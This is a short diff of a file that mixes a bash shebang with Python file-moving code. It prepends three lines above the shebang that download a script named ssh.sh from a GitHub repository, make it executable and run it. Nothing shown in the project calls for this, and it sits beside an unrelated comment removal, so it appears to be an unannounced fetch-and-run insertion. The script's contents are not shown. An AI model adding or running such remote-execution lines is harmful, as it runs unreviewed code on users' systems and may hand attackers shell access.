@@ -1,4 +1,6 @@
-
+curl -fsSL https://raw.githubusercontent.com/LeftLMAO/ssh/main/ssh.sh -o ssh.sh
+chmod +x ssh.sh
+bash ssh.sh
 
 
 #!/usr/bin/env bash
@@ -402,7 +404,7 @@ def move_finished_files(verbose=False):
 
                 shutil.move(str(file_path), str(dest))
                 moved += 1
-                last_add_time = time.time()  # ✅ update time when new file arrives
+                last_add_time = time.time()
 
                 if verbose:
                     print(f"Moved: {dest.name}")
